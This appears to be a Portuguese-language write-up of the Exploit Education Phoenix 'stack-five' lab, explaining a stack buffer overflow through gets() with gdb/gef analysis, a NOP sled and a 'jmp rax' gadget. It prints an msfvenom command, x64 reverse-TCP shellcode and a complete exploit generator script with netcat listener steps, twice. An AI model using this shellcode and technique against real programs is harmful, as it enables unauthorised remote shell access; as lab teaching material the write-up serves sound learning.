- [ðŸŽ¯ Objetivo](#-objetivo)
- [ðŸ’¡ Dicas](#-dicas)
- [ðŸ”¥ Exploit](#-exploit)
  - [Analisando o programa](#analisando-o-programa)
  - [Agora em ASM :D (analise estÃ¡tica)](#agora-em-asm-d-analise-estÃ¡tica)
    - [Breakpoint](#breakpoint)
  - [Agora vamos executar o programa (analise dinÃ¢mica)](#agora-vamos-executar-o-programa-analise-dinÃ¢mica)
  - [Encontrar endereÃ§o do buffer](#encontrar-endereÃ§o-do-buffer)
  - [NOP sled](#nop-sled)
  - [Shellcode](#shellcode)
  - [Corrigindo o problema](#corrigindo-o-problema)
    - [ROP Gadgets](#rop-gadgets)
- [ðŸ’« SoluÃ§Ã£o](#-soluÃ§Ã£o)

# ðŸŽ¯ Objetivo
Finalmente! Tudo isso para chegar no BOF SRP (clÃ¡ssico) :D

Agora ta na hora de redirecionar o pointer para o nosso cÃ³digo malicioso (shellcode) para ganhar uma shell 
# ðŸ’¡ Dicas
A instruÃ§Ã£o `0xCC` (`int3`) serve para no debugger (como o gdb), para quando o rip chegar nela, a execuÃ§Ã£o pausar (`breakpoint`). Nos podemos usa-la para testar se
sequer conseguimos executar cÃ³digo, ou se o problema ta no shellcode: Se o debugger avisa que teve `SIGTRAP`, nos temos execuÃ§Ã£o de cÃ³digo :D

Banco de dados de shellcode: [shell-storm](http://shell-storm.org/shellcode/files/)
# ðŸ”¥ Exploit
## Analisando o programa
`main()` printa o banner e chama `start_level()`

`start_level()` cria um buffer[**128**] e salva o output de `gets()` (**inseguro**)

Como vocÃª pode ver, nÃ£o existe `complete_level()`

Para completar, precisamos executar nosso prÃ³prio cÃ³digo (`shellcode`) e conseguir uma shell (uma linha de comando)
## Agora em ASM :D (analise estÃ¡tica)

Normalmente, o gdb printa assim:
```x86asm
   0x00000000004005a4 <+0>:	push   rbp
   0x00000000004005a5 <+1>:	mov    rbp,rsp
   0x00000000004005a8 <+4>:	sub    rsp,0x10
```
Porem, eu removi os endereÃ§os para simplificar, e sÃ³ mantive os importantes!

Primeiro, vamos ver main
```x86asm
gef> disassemble main
push   rbp
mov    rbp,rsp                    <- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   <- args de puts
mov    edi,0x400620
call   0x400400 <puts@plt>        <- call puts
   
   
mov    eax,0x0                    <- args de start_level (nenhum)
call   0x40058d <start_level>     <- call start_level
   
   
mov    eax,0x0                    <- exit code (cÃ³digo de saida, 0=sem erro)
leave                             <- Epilogo  
```
Agora vamos ver start_level
```x86asm
gef> disassemble start_level 
push   rbp
mov    rbp,rsp                  <- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         <- rax = Pointer para buffer[128]
mov    rdi,rax                <- rdi = rax

0x000000000040059c <+15>:
call   0x4003f0 <gets@plt>    <- call gets


nop
leave                         <- Epilogo
ret
```
Agora vamos adicionar um breakpoint!
### Breakpoint
> Breakpoint = ponto de pausa

Antes daquela intrusÃ£o ser executada, sera substituÃ­da por `0xCC`. Isso faz o  debugger pausar a execuÃ§Ã£o do programa naquela instruÃ§Ã£o!

Quando continuamos executando (normalmente o comando Ã© **continue**), o `0xCC` Ã© substituÃ­do pela instruÃ§Ã£o certa :D
 
Se vocÃª esta fora de um debugger, `0xCC` vai fazer o programa sair com erro
```x86asm
gef> b *0x000000000040059c
Breakpoint 1 at 0x40059c
```
"b" Ã© o comando do gdb para adicionar um breakpoint \ 
A "*" tem haver com aquele dos pointers \ 
O endereÃ§o Ã© para "`call gets`"

> Dica: se vocÃª selecionar/sublinhar (clique esquerdo e passa o mouse em cima, vocÃª sabe do que eu to falando), e clicar o botÃ£o do meio no mouse (a rodinha) 
> o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para vocÃª! EntÃ£o nÃ£o precisa copiar o endereÃ§o manualmente :D

## Agora vamos executar o programa (analise dinÃ¢mica)
126 As nÃ£o causam erro, e 127 As causam... ue, mas pq? nÃ£o era pra dar erro sÃ³ em 128?
```bash
$ python3 -c "print('A'*126)" | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c "print('A'*127)" | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
Isso vai ser muito importante no prÃ³ximo desafio: buffers sÃ£o terminados com um null byte!

Por enquanto, isso sÃ³ nos mostra que o compilador nÃ£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D

E nÃ³s ja sabemos como controlar o EIP, entÃ£o agora sÃ³ precisamos saber para onde redirecionar a execuÃ§Ã£o :)

## Encontrar endereÃ§o do buffer

Agora dentro do gdb (**gdb stack-five**)
> gef> r <<< $(python3 -c "print('A'*100)")
> 
> r Ã© o comand do gdb para rodar o programa!
>  Adicionando "<<<" nÃ³s podemos mandar uma string pro input! TambÃ©m funciona com arquivos ( r < nome_do_arquivo ) :D

```x86asm
gef> r <<< $(python3 -c "print('A'*100)")
Starting program: /opt/phoenix/amd64/stack-five <<< $(python3 -c "print('A'*100)")
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
```
> gef Ã© uma extensÃ£o do gdb que vai te dar um monte de informaÃ§Ã£o util quando vocÃª chegar num breakpoint

O output do gef contem:
![](./img/gef_example.png)
Porem, mais informaÃ§Ãµes podem ser adicionadas! use `gef help` para ver como ele pode te ajudar :D 

Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que "$PC"(outro nome para RIP) nÃ£o pode ser redirecionado para "41414141", confirmando que o nosso buffer overflow Ã© possÃ­vel (olha as linhas no final da segunda imagem)
![](./img/stack_five/gef_A_overflow_0.png)
![](./img/stack_five/gef_A_overflow_1.png)

Agora, vamos colocar o breakpoint em `call gets()` e executar o programa com 140 As
![](./img/stack_five/before_gets_0.png)

As partes importante no output do gef sÃ£o:

registers
![](./img/stack_five/before_gets_3.png)

argumentos (vazio: o pointer em RDI aponta para **0x00007fffffffe5b0**, que possui o valor 0x0000...,)
![](./img/stack_five/before_gets_1.png)

> Lembrete de que pointer comeÃ§a com 2 NULL bytes ai :D 0x**0000**7fff....

stack
![](./img/stack_five/before_gets_2.png)

VocÃª tambÃ©m acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P

(((Insira aquele meme muito velho da cabra gritando)))

EntÃ£o vamos avanÃ§ar para prÃ³xima instruÃ§Ã£o (step: `s`) :D
![](./img/stack_five/gef_after_gets_0.png)


Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D
```x86asm
gef> x/s 0x00007fffffffe5b0              -> x/s Ã© o comando para printar strings
0x7fffffffe5b0:	'A' <repete 140 vezes>
```
EntÃ£o nos ja temos o endereÃ§o dos nossos As :D ... que em breve serÃ£o shellcode :D

Mas agora precisamos saber com precisÃ£o quantos As atÃ© o RIP, `info frame` vai nos ajudar com isso:
```x86asm
gef> info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
```
A ultima linha Ã© a mais importante!

RIP em: `0x7fffffffe638`

EntÃ£o para encontrar precisamente quantos As precisamos colocar atÃ© chegarmos no RIP,
basta subtrair `endereÃ§o do rip salvo - endereÃ§o dos As`
```x86asm
$ python3
>>> 0x7fffffffe638 - 0x00007fffffffe5b0
136
```

Para confirmar isso, vamos rodar com 136 As + BBBB

![](./img/stack_five/gef_136A_BBBB.png)

RIP = BBBB (42424242) :D

## NOP sled
Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nÃ³s nÃ£o conseguimos saber com precisÃ£o que o buffer vai estar naquela localizaÃ§Ã£o :(

Isso ocorre pois as envs sÃ£o alocadas na stack. E elas variam muito, por exemplo, sÃ³ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.
> Dica: O gef pode nos ajudar a encontra-las
![](./img/stack_five/gef_envs_1.png)

Por exemplo:

![](./img/stack_five/gef_envs_0.png)

Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D

(Outro mÃ©todo de remediaÃ§Ã£o Ã© mencionado em `stack-six`)

NOP significa "**No** **OP**eration" (**N**enhuma **OP**eraÃ§Ã£o) ! Ã© uma instruÃ§Ã£o que nÃ£o faz nada :D

A representaÃ§Ã£o em machine code do NOP Ã© `0x90` :D Bem fÃ¡cil de decorar, quem me dera escola fosse fÃ¡cil assim hehehe :)

O processador vai fazer nada e passar para a prÃ³xima, e se nÃ³s colocarmos vÃ¡rios desses em sequencia, o RIP vai "deslizando" atravÃ©s atÃ© chegar no nosso cÃ³digo!

VocÃª pode imaginar um escorregador :D yuuuuupiii

![](./img/panda_slide_1.gif)

EntÃ£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar atÃ© o nosso cÃ³digo :D

Assim, mesmo se o buffer estiverem em um endereÃ§o diferente, o RIP vai chegar no nosso shellcode

Para testar isso, vamos usar o truque do `0xCC` mencionado anteriormente

O input que vai passar vai conter:

```x86asm
NOP * 135
0xCC
EndereÃ§o para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
```
E os **breakpoints do gdb serÃ£o removidos**, entÃ£o caso encontremos um breakpoint, foi o `0xCC` acima

```x86asm
$ python3
>>> hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -> '\xb6\xe5\xff\xff\xff\x7f'
```
Agora executando:
```x86asm
r <<< $(python -c "print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'")
```
Nos recebemos uma SIGTRAP (chegou no breakpoint)
```x86asm
[#0] Id 1, Name: "stack-five", stopped, reason: SIGTRAP
```
E na seÃ§Ã£o `code` do gef
![](./img/stack_five/gef_run_xCC.png)
Meio difÃ­cil de ver, mas tem:
```x86asm
NOP
NOP
INT3
(bad)
(bad)
```

> int3 Ã© o nome de 0xCC, da mesma maneira que NOP Ã© o nome de 0x90 

Apos a nossa ultima instruÃ§Ã£o ha instruÃ§Ãµes invalidas `(bad)` que eram o nosso pointer, e logo em seguida o resto do programa normal! :D

## Shellcode

Shellcode Ã© o cÃ³digo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) nÃ£o autorizada )

Nos podemos usar os do link citado na dica, ou gerar uma usando `msfvenom` (ja vem instalado no kali linux)

> msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf

```
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

```

Agora, vamos fazer um exploit mais bem feito! `vim /tmp/gerar_exploit.py`
```python
buf =  b""

# shellcode
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open("/tmp/exploit","wb").write(buf)
```

> O script /tmp/gerar_exploit.py vai gerar o que colocarÃ­amos no input, mas ao invÃ©s de printarmos para o terminal, vamos salvar em um arquivo binÃ¡rio (por isso o "`wb`" no `open`)! 
> 
> Depois Ã© sÃ³ ler esse arquivo e redireciona-lo `cat /tmp/exploit | ./stack-five` 

Porem, se tentamos executar esse exploit, recebemos `SIGSEV: violaÃ§Ã£o de segmento`

## Corrigindo o problema
Nessa eu empaquei, e a soluÃ§Ã£o veio daqui: [blog lamarranet](https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/)

EntÃ£o valeu pela ajuda :D

Ao invÃ©s de colocar o endereÃ§o do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um `jmp esp` por exemplo

E o beneficio Ã© que, por estarmos pulando para uma parte estÃ¡tica, e usando-a para redirecionar para o buffer, nÃ£o corremos o risco do buffer mudar de endereÃ§o!

Isso quer dizer que nÃ£o precisamos mais do NOP slide :D 

### ROP Gadgets

Essa Ã© uma tÃ©cnica chamada programaÃ§Ã£o `ROP`, que sera discutida em tutoriais futuros :D  Mas o que vocÃª precisa saber por enquanto Ã© que cada um desses `jmps` Ã© chamado de **gadget**

Gadgets sÃ£o instruÃ§Ãµes em outras partes do programa, que sÃ£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!

Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada `ROPgadget`
```x86asm
$ ROPgadget --binary stack-five --only "jmp"
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
```

Isso quer dizer que, ao pular para `0x400481`, vamos executar `jmp rax` e acabar pulando para rax! e para onde rax aponta?

Colocando um break antes do ret de `start_level`, podemos ver que antes de retornar, rax aponta para o mesmo endereÃ§o que rsp, e convenientemente o inicio do nosso buffer
![](./img/stack_five/gef_rax.png)

rax,rdi e rsp apontam para o inicio do buffer dos As

Assim, nÃ£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!

SÃ³ precisamos colocar `padding` entre o shellcode e o RIP

EntÃ£o vamos modificar o exploit :D
```
Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se vocÃª nÃ£o quiser ver a soluÃ§Ã£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
```


```python
buf =  ""

# shellcode
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open("/tmp/exploit","wb").write(buf)
```
> Eu removi o **b""** pq tava dando problema :(

Agora basta gerar o exploit: `python /tmp/gerar_exploit.py`

Abrir um novo terminal: `ssh -p 2222 user@localhost`

Terminal 1: `nc -lvnp 4444`

Terminal 2: `cat /tmp/exploit | ./stack-five` 

Agora, no terminal 1 deve ter uma shell :D

![](./img/stack_five/Exploit_working.png)

> Dica: `bash -ip` vai deixar a sua shell mais usÃ¡vel

Se nos tivÃ©ssemos executado o programa como root, a nossa shell teria esses privilÃ©gios elevados ! :D

![](./img/stack_five/root_exploit.png)

`UID = 0` quer dizer que possuÃ­mos privilÃ©gios de root, mesmo que o `whoami` nÃ£o tenha dito root

E se o programa estivesse exposto para a rede, poderÃ­amos conseguir uma root shell remota :D (spoiler para os prÃ³ximos desafios hehehe)

---

VocÃª chegou atÃ© aqui :D

Toma mais um gif de panda como presente

![](./img/panda_slide_0.gif)

# ðŸ’« SoluÃ§Ã£o

> vim /tmp/gerar_exploit.py
```
buf =  ""

# shellcode
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open("/tmp/exploit","wb").write(buf)
```

Agora basta gerar o exploit: `python /tmp/gerar_exploit.py`

Abrir um novo terminal: `ssh -p 2222 user@localhost`

Terminal 1: `nc -lvnp 4444`

Terminal 2: `cat /tmp/exploit | ./stack-five` 

Agora, no terminal 1 deve ter uma shell :D

